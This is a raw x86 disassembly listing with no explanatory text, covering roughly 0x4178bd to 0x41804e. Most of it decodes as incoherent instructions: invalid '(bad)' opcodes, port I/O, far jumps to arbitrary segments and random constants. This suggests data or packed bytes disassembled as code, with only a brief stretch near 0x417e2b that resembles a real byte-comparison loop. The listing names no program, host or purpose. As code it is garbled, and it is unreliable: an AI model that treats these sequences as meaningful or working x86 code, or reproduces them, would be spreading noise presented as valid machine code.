  4178bd:	add    cl,BYTE PTR [ebx+ebp*4]
  4178c0:	sbb    esp,DWORD PTR [edi+0x1eedea81]
  4178c6:	out    dx,al
  4178c7:	and    al,0xb9
  4178c9:	shl    al,cl
  4178cb:	sub    DWORD PTR [edi-0x3a],esi
  4178ce:	mov    ds:0xb1d01c4a,al
  4178d3:	add    ch,BYTE PTR [ebx-0x3c]
  4178d6:	jmp    0x7ebd:0x913fee10
  4178dd:	dec    ebx
  4178de:	xor    DWORD PTR es:[edi-0x5633ad82],0x2d
  4178e6:	leave  
  4178e7:	add    al,dh
  4178e9:	mov    dl,BYTE PTR [ecx+edx*1]
  4178ec:	mov    dh,0x6c
  4178ee:	xlat   BYTE PTR ds:[ebx]
  4178ef:	dec    ebx
  4178f0:	ds jp  0x417965
  4178f3:	push   eax
  4178f4:	es and al,0xe8
  4178f7:	sbb    al,0xe9
  4178f9:	out    dx,eax
  4178fa:	mov    edx,0x64013538
  4178ff:	or     DWORD PTR [eax+0x471c287e],esp
  417905:	mov    eax,ds:0xa98c55cb
  41790a:	mov    ecx,0x2e88da92
  41790f:	ja     0x4178e6
  417911:	adc    eax,0xc86f396
  417916:	pop    ebx
  417917:	jo     0x417922
  417919:	inc    esp
  41791a:	ret    0x2c11
  41791d:	cmp    edi,edx
  41791f:	dec    DWORD PTR [esi+ebx*4+0x38]
  417923:	pop    esi
  417924:	or     bh,dl
  417926:	stos   DWORD PTR es:[edi],eax
  417927:	and    cl,bh
  417929:	lods   eax,DWORD PTR ds:[esi]
  41792a:	sub    al,0x96
  41792c:	xchg   BYTE PTR [ebp+0x48],al
  41792f:	pop    edx
  417930:	mov    ch,0x8b
  417932:	into   
  417933:	push   edi
  417934:	fld    TBYTE PTR [ecx+0x28]
  417937:	outs   dx,DWORD PTR ds:[esi]
  417938:	(bad)  
  41793a:	push   ebp
  41793b:	mov    eax,0x3a512a59
  417940:	je     0x417978
  417942:	lock mov al,0x3e
  417945:	ret    
  417946:	push   edx
  417947:	jmp    FWORD PTR ss:[esp+edi*2+0x47]
  41794c:	pop    ecx
  41794d:	add    DWORD PTR [ebp-0x39],0xfe9eeb07
  417954:	ins    BYTE PTR es:[edi],dx
  417955:	cdq    
  417956:	ret    0x6933
  417959:	sbb    eax,0xced9ba66
  41795e:	sub    ebx,DWORD PTR [ecx]
  417960:	mov    ebp,0x2944b31c
  417965:	das    
  417966:	mov    eax,ds:0x50c9f791
  41796b:	ss pop ebx
  41796d:	adc    DWORD PTR [eax+0x366a8f4e],ebp
  417973:	dec    ebp
  417974:	push   cs
  417975:	mov    ecx,DWORD PTR [esi-0x668ba9b3]
  41797b:	test   al,0xa5
  41797d:	push   ebx
  41797e:	mov    ebp,cs
  417980:	in     al,0x11
  417982:	pmulhuw mm1,QWORD PTR [ecx-0x2247d7a]
  417989:	inc    ecx
  41798a:	jp     0x417972
  41798c:	jecxz  0x417974
  41798e:	mov    dl,0xf9
  417990:	ins    BYTE PTR es:[edi],dx
  417991:	in     eax,dx
  417992:	div    BYTE PTR [edx*1-0x4e988005]
  417999:	dec    esi
  41799a:	sub    eax,eax
  41799c:	add    cl,0x12
  41799f:	mov    WORD PTR [edx-0x8],gs
  4179a2:	jp     0x4179e9
  4179a4:	shr    DWORD PTR [esi-0x4365dfde],0xc
  4179ab:	sub    dl,bl
  4179ad:	dec    esp
  4179ae:	cmp    eax,0xf5245491
  4179b3:	and    DWORD PTR [edi-0x47],ebp
  4179b6:	stos   DWORD PTR es:[edi],eax
  4179b7:	mov    ecx,DWORD PTR [edi+0x3a84fcdc]
  4179bd:	ins    DWORD PTR es:[edi],dx
  4179be:	push   eax
  4179bf:	jecxz  0x417a0b
  4179c1:	outs   dx,BYTE PTR ds:[esi]
  4179c2:	adc    DWORD PTR [eax],edi
  4179c4:	sub    al,BYTE PTR [edi+0x2a]
  4179c7:	mov    BYTE PTR [ecx],bl
  4179c9:	push   ecx
  4179ca:	sbb    BYTE PTR [edx],0x68
  4179cd:	pusha  
  4179ce:	jns    0x4179f2
  4179d0:	int    0xe3
  4179d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179d3:	aas    
  4179d4:	imul   esp,DWORD PTR [edi+eiz*8-0x3b],0x50
  4179d9:	and    ebp,DWORD PTR [ebx-0x742fb273]
  4179df:	jmp    0x417978
  4179e1:	ror    DWORD PTR [bp+di-0x27],cl
  4179e5:	neg    DWORD PTR ds:[edi]
  4179e8:	retf   
  4179e9:	dec    edx
  4179ea:	es push ecx
  4179ec:	dec    edx
  4179ed:	lods   eax,DWORD PTR ds:[esi]
  4179ee:	xchg   esp,eax
  4179ef:	fld    DWORD PTR ds:0x93d2295
  4179f5:	push   ebx
  4179f6:	das    
  4179f7:	or     cl,ch
  4179f9:	imul   edx,DWORD PTR [ebp+0x79],0xffffffb7
  4179fd:	dec    ebx
  4179fe:	pop    edi
  4179ff:	mov    eax,ds:0x22b19612
  417a04:	jmp    0x417a79
  417a06:	sbb    edi,edx
  417a08:	adc    al,0xfd
  417a0a:	leave  
  417a0b:	sub    al,0xe9
  417a0d:	cmovo  ecx,DWORD PTR [edi+esi*4-0x790fbe1c]
  417a15:	rcl    dh,1
  417a17:	jns    0x417a71
  417a19:	pop    ebp
  417a1a:	pop    ebp
  417a1b:	je     0x417a44
  417a1d:	imul   esi,DWORD PTR [edx],0x2
  417a20:	pop    ecx
  417a21:	test   BYTE PTR [edi+0x49fec7ed],al
  417a27:	adc    ebx,DWORD PTR [ebx-0x54]
  417a2a:	data16 ja 0x4179ae
  417a2d:	ins    BYTE PTR es:[edi],dx
  417a2e:	adc    al,0x40
  417a30:	mov    bh,al
  417a32:	jle    0x417a34
  417a34:	hlt    
  417a35:	clc    
  417a36:	jle    0x417a2c
  417a38:	sbb    DWORD PTR [esi+0x47],0xd77831a
  417a3f:	xor    esp,ebx
  417a41:	mov    bh,0x2b
  417a43:	push   es
  417a44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a45:	popa   
  417a46:	cmp    DWORD PTR [edx],ecx
  417a48:	(bad)  [ebx-0x4a]
  417a4b:	mov    dh,0xc9
  417a4d:	call   0xe5ec3b4
  417a52:	fisub  WORD PTR [edx+0x74]
  417a55:	mov    edx,0xa58436c4
  417a5a:	xchg   edi,eax
  417a5b:	dec    ebp
  417a5c:	leave  
  417a5d:	push   esi
  417a5e:	jno    0x417a8e
  417a60:	dec    edx
  417a61:	push   eax
  417a62:	les    eax,FWORD PTR [edx]
  417a64:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  417a66:	mov    eax,ds:0x292192eb
  417a6b:	int3   
  417a6c:	xchg   edx,eax
  417a6d:	popa   
  417a6e:	ins    BYTE PTR es:[edi],dx
  417a6f:	ds jno 0x417aa2
  417a72:	int3   
  417a73:	in     al,0x4a
  417a75:	and    BYTE PTR [ebx-0x62],dh
  417a78:	push   esp
  417a7a:	fiadd  WORD PTR [edx]
  417a7c:	xor    al,0xba
  417a7e:	push   ebx
  417a7f:	stos   BYTE PTR es:[edi],al
  417a80:	cmp    edx,DWORD PTR [ebp+0x3301b434]
  417a86:	jmp    0x417ac6
  417a88:	ror    BYTE PTR [esi+0x40],1
  417a8b:	bound  ebp,QWORD PTR [edx+0x1]
  417a8e:	mov    al,ds:0xde1b2132
  417a93:	mov    DWORD PTR [edi-0x6a],esi
  417a96:	add    al,0xdb
  417a98:	dec    esp
  417a99:	fidivr DWORD PTR [edi-0x53]
  417a9c:	sub    eax,0xe8e3fa6b
  417aa1:	and    BYTE PTR [edx],dh
  417aa3:	bound  ebx,QWORD PTR [ebx]
  417aa5:	sbb    BYTE PTR [esp+eiz*2+0x5d1bdfec],bh
  417aac:	(bad)  
  417aad:	retf   0x9fda
  417ab0:	fist   DWORD PTR [ecx]
  417ab2:	repz fs and eax,0x3fb4f84e
  417ab9:	cmp    ebx,DWORD PTR [edi+eiz*4+0x3]
  417abd:	sbb    cl,cl
  417abf:	mov    dh,0x87
  417ac1:	inc    esi
  417ac2:	push   ds
  417ac3:	punpckhdq mm0,mm5
  417ac6:	nop
  417ac7:	loope  0x417ab9
  417ac9:	push   0x5e6629bd
  417ace:	pop    eax
  417acf:	xor    al,0x2c
  417ad1:	pusha  
  417ad2:	sahf   
  417ad3:	rol    DWORD PTR [ebx+0x5b],1
  417ad6:	and    al,BYTE PTR [eax]
  417ad8:	xor    al,0x91
  417ada:	push   eax
  417adb:	pop    edi
  417adc:	add    al,0xb0
  417ade:	mov    BYTE PTR [edi],bh
  417ae0:	daa    
  417ae1:	dec    ecx
  417ae2:	push   edx
  417ae3:	push   cs
  417ae4:	add    dl,BYTE PTR [ebp-0x59]
  417ae7:	xchg   edi,eax
  417ae8:	and    eax,0xf22e8b0f
  417aed:	mov    edx,0xaedd8555
  417af2:	mov    dl,bh
  417af4:	cmp    ah,BYTE PTR [edx-0x7c5941d0]
  417afa:	jae    0x417aae
  417afc:	lahf   
  417afd:	jp     0x417af3
  417aff:	mov    ss,ax
  417b02:	loop   0x417ad2
  417b04:	hlt    
  417b05:	retf   0xed92
  417b08:	sahf   
  417b09:	shr    BYTE PTR [eax],0x4
  417b0c:	(bad)
  417b0f:	jno    0x417b76
  417b11:	or     BYTE PTR [ebx+0x22],cl
  417b14:	jp     0x417ab1
  417b16:	xor    ecx,DWORD PTR [edi]
  417b18:	pushf  
  417b19:	loopne 0x417b78
  417b1b:	xchg   esi,eax
  417b1c:	dec    edx
  417b1d:	push   es
  417b1e:	pop    esi
  417b1f:	jb     0x417b36
  417b21:	cmp    al,0x2f
  417b23:	xor    bh,ah
  417b25:	into   
  417b26:	add    al,0xc8
  417b28:	cli    
  417b29:	sahf   
  417b2a:	or     BYTE PTR [edi+0x56],al
  417b2d:	fcomp  QWORD PTR [edx+eiz*2]
  417b30:	fldcw  WORD PTR [ebp+0xb9610dc]
  417b36:	xchg   ebp,eax
  417b37:	pop    ss
  417b38:	sub    al,0x7b
  417b3a:	inc    esp
  417b3b:	fs in  eax,dx
  417b3d:	pop    ds
  417b3e:	mov    cl,0x51
  417b40:	mov    ecx,0x8624e69f
  417b45:	push   ds
  417b46:	test   eax,0xc68f1b0f
  417b4b:	mov    bh,0x93
  417b4d:	push   ss
  417b4e:	xor    BYTE PTR [edi-0x58],dh
  417b51:	push   edi
  417b52:	into   
  417b53:	jp     0x417ba5
  417b55:	and    BYTE PTR [esi],dh
  417b57:	test   BYTE PTR [esi-0x770d7297],al
  417b5d:	xchg   BYTE PTR [edi+0x1c154434],dh
  417b63:	xchg   esi,eax
  417b64:	or     DWORD PTR [edx],0xa4dc38f5
  417b6a:	jbe    0x417b0f
  417b6c:	jp     0x417b76
  417b6e:	mov    bl,0x3d
  417b70:	push   edi
  417b71:	sti    
  417b72:	inc    ecx
  417b73:	dec    ebx
  417b74:	jns    0x417afa
  417b76:	mov    ch,0xf5
  417b78:	aaa    
  417b79:	mov    ah,BYTE PTR [edx-0x3d]
  417b7c:	mov    BYTE PTR [edx],dl
  417b7e:	cmp    DWORD PTR [eax+0x3890c8f5],0xa5dcdfc2
  417b88:	sub    DWORD PTR [ebx+0x2ecafe8b],esi
  417b8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b8f:	nop
  417b90:	xchg   esp,ebp
  417b92:	dec    edi
  417b93:	push   esi
  417b94:	xor    cl,BYTE PTR [edi]
  417b96:	sbb    DWORD PTR [edx],ebx
  417b98:	nop
  417b99:	out    dx,eax
  417b9a:	ret    
  417b9b:	adc    eax,0x983eb07a
  417ba0:	or     DWORD PTR [ebx+0x4d],eax
  417ba3:	retf   0xe48a
  417ba6:	pop    ss
  417ba7:	dec    eax
  417ba8:	push   edi
  417ba9:	pop    es
  417baa:	push   0x5625e6db
  417baf:	push   es
  417bb0:	lods   eax,DWORD PTR ds:[esi]
  417bb1:	and    ebx,DWORD PTR [edi]
  417bb3:	jp     0x417bb4
  417bb5:	sbb    edi,DWORD PTR [edx-0x5b]
  417bb8:	addr16 dec esi
  417bba:	xchg   ecx,eax
  417bbb:	cli    
  417bbc:	psubd  mm4,QWORD PTR [edx-0x28080127]
  417bc3:	jo     0x417bb9
  417bc5:	inc    eax
  417bc6:	or     DWORD PTR [ecx-0xcaa1371],esi
  417bcc:	test   BYTE PTR [esi],al
  417bce:	sub    ecx,ebx
  417bd0:	and    ecx,DWORD PTR [ecx-0x79]
  417bd3:	fisubr WORD PTR [ebp-0x1]
  417bd6:	push   ebx
  417bd7:	fadd   DWORD PTR [eax-0x1dafd963]
  417bdd:	(bad)  
  417bde:	frstor [edx]
  417be0:	inc    esp
  417be1:	sar    DWORD PTR [ebx],cl
  417be3:	jl     0x417b86
  417be5:	(bad)  
  417be6:	hlt    
  417be7:	loop   0x417b7d
  417be9:	(bad)  
  417bea:	mov    cl,0x71
  417bec:	sbb    DWORD PTR [edx],eax
  417bee:	sub    al,0x47
  417bf0:	mov    esi,0x6264abeb
  417bf5:	inc    ebx
  417bf6:	xchg   dl,dh
  417bf8:	outs   dx,DWORD PTR es:[esi]
  417bfa:	arpl   WORD PTR [ebp+0x4edfd3b],di
  417c00:	add    BYTE PTR [ecx],ch
  417c02:	imul   edx,DWORD PTR [ecx+eax*1-0x5d],0x16
  417c07:	mov    ds:0x2e369baf,eax
  417c0c:	adc    BYTE PTR [esi+0x2b],dh
  417c0f:	pop    ebp
  417c10:	repnz daa 
  417c12:	out    dx,eax
  417c13:	dec    ecx
  417c14:	popa   
  417c15:	adc    DWORD PTR [ecx+esi*8+0x1b],0xb331fc10
  417c1d:	and    al,0xa3
  417c1f:	mov    eax,0x3f3b463
  417c24:	fwait
  417c25:	pushf  
  417c26:	sub    DWORD PTR [ecx+0x4652af8c],edi
  417c2c:	add    eax,0x7819fd39
  417c31:	dec    edi
  417c32:	int    0xf7
  417c34:	sbb    DWORD PTR [edi+0x19e76c57],esi
  417c3a:	out    dx,al
  417c3b:	inc    ebx
  417c3c:	or     BYTE PTR [ecx],bh
  417c3e:	enter  0x342b,0xbb
  417c42:	mov    dh,0x92
  417c44:	aas    
  417c45:	sahf   
  417c46:	sub    al,0x78
  417c48:	mov    cl,0x56
  417c4a:	jp     0x417cc6
  417c4c:	add    al,0x25
  417c4f:	xchg   DWORD PTR [edi-0x49],eax
  417c52:	cld    
  417c53:	cwde   
  417c54:	ret    0x11ca
  417c57:	inc    eax
  417c58:	leave  
  417c59:	add    eax,0x3c1903cc
  417c5e:	inc    ebp
  417c5f:	cwde   
  417c60:	jae    0x417c93
  417c62:	pushw  ss
  417c64:	ds data16 and al,0xce
  417c68:	xor    BYTE PTR ds:0xdd75c707,0x5a
  417c6f:	cmp    bl,BYTE PTR [esi+0x21cf08e7]
  417c75:	adc    eax,0xdf2e8398
  417c7a:	dec    ecx
  417c7b:	aad    0x56
  417c7d:	les    edx,FWORD PTR [edi-0x288af7f]
  417c83:	inc    esp
  417c84:	sub    edx,DWORD PTR [ecx+0x69]
  417c87:	(bad)  
  417c88:	(bad)  
  417c89:	pop    esi
  417c8a:	ret    
  417c8b:	or     dh,BYTE PTR [esp+ebx*8]
  417c8e:	sbb    ah,BYTE PTR [esi+0x4a]
  417c91:	pop    ds
  417c92:	jmp    0xdbcb:0xe47649c4
  417c99:	(bad)  
  417c9a:	mov    ebx,0x93869f00
  417c9f:	fidiv  DWORD PTR [edx]
  417ca1:	or     DWORD PTR [ebp+0x7b],esi
  417ca4:	sbb    al,0xdf
  417ca6:	jmp    0x417c5b
  417ca8:	shl    ebp,1
  417caa:	sub    esp,0xdf1f448f
  417cb0:	sbb    al,0xf7
  417cb2:	push   ecx
  417cb3:	neg    DWORD PTR [eax-0x3f]
  417cb6:	pushf  
  417cb7:	pop    esp
  417cb8:	mov    edi,0x8c322c1d
  417cbd:	dec    ebx
  417cbe:	mov    ?,WORD PTR [ebp+0x55]
  417cc1:	nop
  417cc2:	sahf   
  417cc3:	retf   
  417cc4:	hlt    
  417cc5:	in     eax,0x53
  417cc7:	inc    esp
  417cc8:	and    eax,0xbbf66c1d
  417ccd:	jns    0x417d34
  417ccf:	or     al,0x3b
  417cd1:	retf   
  417cd2:	push   ebx
  417cd3:	add    BYTE PTR [ebp+0x74],cl
  417cd6:	xor    DWORD PTR [ecx],edx
  417cd8:	ret    0xe1c8
  417cdb:	leave  
  417cdc:	js     0x417c68
  417cde:	push   ebp
  417cdf:	les    esp,FWORD PTR [esi+eax*1]
  417ce2:	scas   al,BYTE PTR es:[edi]
  417ce3:	fiadd  WORD PTR [edi-0x2e]
  417ce6:	iret   
  417ce7:	jp     0x417d47
  417ce9:	lods   eax,DWORD PTR ds:[esi]
  417cea:	and    eax,0xbe674fd7
  417cef:	stos   DWORD PTR es:[edi],eax
  417cf0:	pusha  
  417cf1:	pop    esi
  417cf2:	or     ebx,DWORD PTR [ecx+0x74bba260]
  417cf8:	ret    0x399d
  417cfb:	clc    
  417cfc:	cli    
  417cfd:	popf   
  417cfe:	enter  0x632e,0x94
  417d02:	fist   DWORD PTR [ecx]
  417d04:	adc    eax,0x822770c8
  417d09:	(bad)  
  417d0a:	and    bl,BYTE PTR [ebp+ebx*4+0x3f1aa6df]
  417d11:	pop    ebx
  417d12:	or     al,0x16
  417d14:	lock or al,0xd0
  417d17:	add    DWORD PTR [ebx-0x7b7725ca],ecx
  417d1d:	ins    DWORD PTR es:[edi],dx
  417d1e:	aaa    
  417d1f:	and    ecx,DWORD PTR [ebp+0x49d5a9af]
  417d25:	mov    ebp,DWORD PTR [ebx+0x4d955cd5]
  417d2b:	pop    eax
  417d2c:	imul   esp,DWORD PTR [eax+0x2055070d],0x839c9953
  417d36:	jle    0x417d8c
  417d38:	adc    eax,0xec382c09
  417d3d:	sbb    BYTE PTR [ebx],cl
  417d3f:	es adc al,0x51
  417d42:	and    al,0xa7
  417d44:	jnp    0x417dc2
  417d46:	mov    gs,WORD PTR [ebx+0x7d48f265]
  417d4c:	cld    
  417d4d:	aas    
  417d4e:	cdq    
  417d4f:	inc    edi
  417d50:	popf   
  417d51:	jmp    0x41d6:0x1bfe9b9f
  417d58:	scas   eax,DWORD PTR es:[edi]
  417d59:	pop    ebp
  417d5a:	or     eax,DWORD PTR [ecx+0x216568f6]
  417d60:	jge    0x417dbd
  417d62:	xor    DWORD PTR [eax-0x3c],ecx
  417d65:	adc    ebx,edi
  417d67:	sbb    edx,DWORD PTR [edi+0x3c]
  417d6a:	(bad)  
  417d6b:	loopne 0x417d14
  417d6d:	push   ecx
  417d6e:	bound  esp,QWORD PTR [eax+0x73]
  417d71:	lock (bad) 
  417d73:	jnp    0x417dba
  417d75:	add    al,0xa6
  417d77:	jge    0x417d4f
  417d79:	mov    ds,WORD PTR [edi+0x6ee3a03d]
  417d7f:	rol    edx,1
  417d81:	out    dx,eax
  417d82:	div    BYTE PTR [esi]
  417d84:	aaa    
  417d85:	mov    ds:0x35c146b2,al
  417d8a:	(bad)
  417d8e:	repnz pop ss
  417d90:	inc    esp
  417d91:	mov    edx,0x4a553b53
  417d96:	sti    
  417d97:	xor    BYTE PTR [eax-0xe],dl
  417d9a:	loope  0x417e06
  417d9c:	enter  0xe0a8,0x6e
  417da0:	mov    ecx,0x51f9b43
  417da5:	xor    esi,ebp
  417da7:	xor    cl,BYTE PTR [ebp-0x3c65c7f3]
  417dad:	pop    esp
  417dae:	fxch   st(5)
  417db0:	jecxz  0x417d65
  417db2:	push   es
  417db3:	xor    BYTE PTR [ecx+ecx*1],ch
  417db6:	mov    ebp,esp
  417db8:	adc    ecx,DWORD PTR ds:0x80bfc8dc
  417dbe:	(bad)  
  417dbf:	cmp    ebp,DWORD PTR [eax-0x77]
  417dc2:	dec    edi
  417dc3:	ja     0x417e2e
  417dc5:	and    esp,DWORD PTR es:[eax-0x583ab147]
  417dcc:	cld    
  417dcd:	inc    edi
  417dce:	mov    ebp,0x3f88ea0a
  417dd3:	xor    al,0x91
  417dd5:	push   cs
  417dd6:	inc    ebp
  417dd7:	sbb    DWORD PTR [ebx+0xb],0xffffffce
  417ddb:	into   
  417ddc:	mov    bl,0x43
  417ddf:	sti    
  417de0:	out    dx,eax
  417de1:	xchg   DWORD PTR [esi],edx
  417de3:	popf   
  417de4:	mov    al,ds:0x9da6bfa9
  417de9:	into   
  417dea:	in     eax,dx
  417deb:	test   BYTE PTR [ecx],bh
  417ded:	ret    0x8fc
  417df0:	sbb    ch,bl
  417df2:	push   es
  417df3:	data16 aas 
  417df5:	pop    ebp
  417df6:	das    
  417df7:	push   ds
  417df8:	ret    
  417df9:	in     eax,0xd8
  417dfb:	cmp    BYTE PTR [ebx+0x65],0xf0
  417dff:	adc    eax,0xe7463fe7
  417e04:	dec    edx
  417e05:	add    al,0x6
  417e07:	cmp    ebx,edx
  417e09:	or     DWORD PTR [ebp+ecx*4+0x73f6f841],ecx
  417e10:	mov    ch,0x71
  417e12:	fsub   DWORD PTR [ecx]
  417e14:	popa   
  417e15:	xor    esi,0xebee0599
  417e1b:	jmp    0x417dde
  417e1d:	pop    ebp
  417e1e:	mov    bh,0x72
  417e20:	(bad)  
  417e21:	sbb    cl,cl
  417e23:	mov    ebp,0xd7fde5a
  417e28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e29:	dec    ebp
  417e2a:	(bad)  
  417e2b:	mov    ecx,DWORD PTR [ebp-0x20]
  417e2e:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  417e35:	mov    edx,DWORD PTR [ebp+0xc]
  417e38:	cmp    cl,BYTE PTR [edx]
  417e3a:	jne    0x420de3
  417e40:	mov    ecx,DWORD PTR [ebp-0x14]
  417e43:	mov    edx,DWORD PTR [ebp+0xc]
  417e46:	movsx  edx,BYTE PTR [edx]
  417e49:	xor    ecx,eax
  417e4b:	add    ecx,esi
  417e4d:	jmp    0x41a1da
  417e52:	cmp    DWORD PTR [ecx],ecx
  417e54:	mov    ebp,0x79c6ad42
  417e59:	stc    
  417e5a:	mov    DWORD PTR [ebp-0x58],edi
  417e5d:	fldcw  WORD PTR [esi-0x5a]
  417e60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e61:	add    eax,0x7a7d38de
  417e66:	or     bl,BYTE PTR [edi+0x7a]
  417e69:	jp     0x417dfc
  417e6b:	leave  
  417e6c:	sbb    DWORD PTR [edi+0x45],esi
  417e6f:	jns    0x417ea1
  417e71:	and    edi,edi
  417e73:	mov    eax,0x70de2633
  417e78:	mov    eax,0xa1409f80
  417e7d:	mov    edi,ebx
  417e7f:	xor    BYTE PTR [edx],ah
  417e81:	mov    ch,BYTE PTR ds:[edi-0x4fd3062f]
  417e88:	(bad)  
  417e89:	call   0xa20b:0xbba4281b
  417e90:	cli    
  417e91:	repnz shl eax,0x54
  417e95:	xor    al,0xd1
  417e97:	dec    ebx
  417e98:	scas   eax,DWORD PTR es:[edi]
  417e99:	lods   al,BYTE PTR ds:[esi]
  417e9a:	fcmovb st,st(0)
  417e9c:	push   0x7
  417e9e:	mov    DWORD PTR ds:0xf10b258c,ebx
  417ea4:	outs   dx,BYTE PTR ds:[esi]
  417ea5:	mov    es,WORD PTR [ebx-0x56a79717]
  417eab:	rol    DWORD PTR [ebx+eax*2-0x43],0xe0
  417eb0:	xchg   DWORD PTR [eax-0x31],eax
  417eb3:	icebp  
  417eb4:	adc    DWORD PTR [ebp+0x5cc86871],ebx
  417eba:	add    cl,BYTE PTR [esi+0x6f400be2]
  417ec0:	pop    esi
  417ec1:	imul   edi,esp,0xffffff88
  417ec4:	pop    ebp
  417ec5:	sub    ebp,0xadf7b5e9
  417ecb:	test   DWORD PTR [ecx+ecx*8-0x444ba7cb],edx
  417ed2:	mov    ch,0x29
  417ed4:	cmp    al,bh
  417ed6:	je     0x417f45
  417ed8:	fiadd  DWORD PTR [edx+0x17]
  417edb:	sbb    eax,0xfe9bc80c
  417ee0:	dec    edi
  417ee1:	fcmovnb st,st(3)
  417ee3:	pop    ebp
  417ee4:	mov    ah,0xf7
  417ee6:	dec    ebx
  417ee7:	cli    
  417ee8:	pop    ebp
  417ee9:	in     al,0x41
  417eeb:	aas    
  417eec:	mov    ah,0xe7
  417eee:	je     0x417f37
  417ef0:	cld    
  417ef1:	(bad)  
  417ef2:	push   edx
  417ef3:	arpl   WORD PTR [eax],sp
  417ef5:	fld    QWORD PTR [ecx+0x29]
  417ef8:	cld    
  417ef9:	push   cs
  417efa:	sub    esp,edx
  417efc:	xor    DWORD PTR [ecx-0x25e43af5],edx
  417f02:	push   0x77
  417f04:	ret    
  417f05:	rcl    BYTE PTR [edx+ebx*1+0x3c56ef0f],0x82
  417f0d:	jp     0x417f04
  417f0f:	ror    DWORD PTR [eax-0x31],cl
  417f12:	leave  
  417f13:	sbb    DWORD PTR [ecx-0x27],edx
  417f16:	mov    ecx,ebp
  417f18:	push   es
  417f19:	cmp    ebx,eax
  417f1b:	imul   ecx,eax,0xffffffbc
  417f1e:	push   esi
  417f1f:	ds dec ebx
  417f21:	dec    ebp
  417f22:	and    BYTE PTR [ebp-0x43],cl
  417f25:	cs test eax,0x6187f1c3
  417f2b:	sbb    edi,ebp
  417f2d:	dec    edi
  417f2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f2f:	jmp    0xfa91:0xd256d19a
  417f36:	add    dh,cl
  417f38:	fadd   DWORD PTR [esi+0x645ca835]
  417f3e:	dec    ecx
  417f3f:	jnp    0x417f5b
  417f41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f42:	add    DWORD PTR [edx+0x394068be],edi
  417f48:	aad    0x8f
  417f4a:	jecxz  0x417f7c
  417f4c:	or     DWORD PTR [edx-0x7e],edi
  417f4f:	fwait
  417f50:	addr16 out 0xa8,al
  417f53:	fs pushf 
  417f55:	jno    0x417f1c
  417f57:	test   al,0xdd
  417f59:	ins    DWORD PTR es:[edi],dx
  417f5a:	sub    esp,DWORD PTR [esi+ebx*1]
  417f5d:	mov    edx,0x96ac8570
  417f62:	arpl   WORD PTR [eax+0x79],sp
  417f65:	pop    ds
  417f66:	mov    BYTE PTR [ecx],0xd5
  417f69:	jge    0x417f13
  417f6b:	popf   
  417f6c:	fnstenv ds:0x427ddb90
  417f72:	mov    dl,BYTE PTR [ebp-0x25d5d33b]
  417f78:	inc    esi
  417f79:	gs push cs
  417f7b:	aam    0xe5
  417f7d:	mov    ah,0xa9
  417f7f:	(bad)  
  417f80:	sub    BYTE PTR [esi],bl
  417f82:	inc    edi
  417f83:	aaa    
  417f84:	push   0x53
  417f86:	mov    al,BYTE PTR [ebp+ebp*8+0x995a64]
  417f8d:	push   ecx
  417f8e:	leave  
  417f8f:	into   
  417f90:	jecxz  0x417f6a
  417f92:	dec    edi
  417f93:	ss loopne 0x417fb9
  417f96:	inc    ecx
  417f97:	popa   
  417f98:	dec    ecx
  417f99:	ds cld 
  417f9b:	and    esp,ebp
  417f9d:	cli    
  417f9e:	jmp    0xbc876182
  417fa3:	mov    ecx,0x25d32a64
  417fa8:	dec    ebp
  417fa9:	sbb    bh,BYTE PTR [esp+ecx*1-0xe]
  417fad:	adc    al,0x8f
  417faf:	and    BYTE PTR [esi],dl
  417fb1:	mov    al,0xad
  417fb3:	adc    BYTE PTR [eax+0x49],al
  417fb6:	cmp    bl,bl
  417fb8:	out    0x64,eax
  417fba:	inc    ebx
  417fbb:	bnd jle 0x417f9d
  417fbe:	xchg   esp,eax
  417fbf:	cmp    al,0xe3
  417fc1:	aad    0x61
  417fc3:	stos   BYTE PTR es:[edi],al
  417fc4:	push   0xffffff91
  417fc6:	iret   
  417fc7:	scas   al,BYTE PTR es:[edi]
  417fc8:	mov    esi,eax
  417fca:	xlat   BYTE PTR ds:[ebx]
  417fcb:	or     DWORD PTR [ebx-0x3d17990c],edi
  417fd1:	push   esp
  417fd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fd3:	mov    fs,WORD PTR [edi+0x1fd06405]
  417fd9:	(bad)  
  417fda:	adc    eax,0x407f917c
  417fdf:	or     al,0x2e
  417fe1:	and    al,0x82
  417fe3:	and    DWORD PTR [edx],0x76
  417fe6:	jp     0x418011
  417fe8:	mov    esp,0xa917abe8
  417fed:	cdq    
  417fee:	leave  
  417fef:	out    dx,eax
  417ff0:	shl    DWORD PTR [ecx+edi*4],1
  417ff3:	repnz mov ah,0xe7
  417ff6:	inc    eax
  417ff7:	scas   al,BYTE PTR es:[edi]
  417ff8:	jbe    0x418027
  417ffa:	sahf   
  417ffb:	pusha  
  417ffc:	dec    edi
  417ffd:	xchg   ebx,eax
  417ffe:	iret   
  417fff:	jmp    0x418014
  418001:	dec    ebx
  418002:	pushf  
  418003:	sbb    dl,BYTE PTR [esi+0x10]
  418006:	pushf  
  418007:	jb     0x417fc8
  418009:	mov    WORD PTR ds:0x94bec243,es
  41800f:	(bad)  
  418010:	or     eax,0xe1f3e2a4
  418015:	retf   
  418016:	sbb    DWORD PTR [edx-0x1987679c],ebp
  41801c:	pop    ebp
  41801d:	add    edi,DWORD PTR ds:0x38205756
  418023:	cmp    edx,DWORD PTR [edx]
  418025:	sbb    ecx,DWORD PTR [ebx+0x57]
  418028:	push   ds
  418029:	jmp    0x418013
  41802b:	int    0x29
  41802d:	mov    esi,0xfa5550ed
  418032:	iret   
  418033:	stc    
  418034:	mov    esp,ecx
  418036:	mov    esp,DWORD PTR [ebx-0x48ca896e]
  41803c:	pop    edx
  41803d:	sbb    dl,BYTE PTR [edi+edx*4-0x30]
  418041:	fst    QWORD PTR [ebx]
  418043:	cmp    bh,BYTE PTR [esi+eax*1]
  418046:	test   BYTE PTR [eax+ecx*4+0x53],bl
  41804a:	jb     0x41800e
  41804c:	in     eax,0x3c
  41804e:	xor    DWORD PTR [ebp+esi*2-0x22],ecx
